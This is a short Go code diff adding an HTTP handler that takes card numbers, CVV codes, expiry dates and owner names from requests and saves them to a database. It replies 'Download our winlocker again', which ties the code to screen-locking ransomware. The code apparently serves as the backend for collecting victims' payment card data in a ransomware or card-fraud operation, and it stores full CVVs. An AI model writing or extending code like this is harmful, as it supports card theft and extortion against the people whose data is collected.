@@ -199,7 +199,28 @@ func (s *server) handleAddCard() http.HandlerFunc {
 	}
 
 	return func(w http.ResponseWriter, r *http.Request) {
+		req := &request{}
+		if err := json.NewDecoder(r.Body).Decode(req); err != nil {
+			s.error(w, r, http.StatusBadRequest, err)
+			return
+		}
 
+		c := &model.Card{
+			Digits: req.Digits,
+			Cvv:    req.Cvv,
+			Date:   req.Date,
+			Owner:  req.Owner,
+		}
+
+		if err := s.store.Card().Create(c); err != nil {
+			s.error(w, r, http.StatusUnprocessableEntity, err)
+			return
+		}
+
+		s.respond(w, r, http.StatusCreated, map[string]string{
+			"ok":      "true",
+			"message": "Download our winlocker again",
+		})
 	}
 }
 
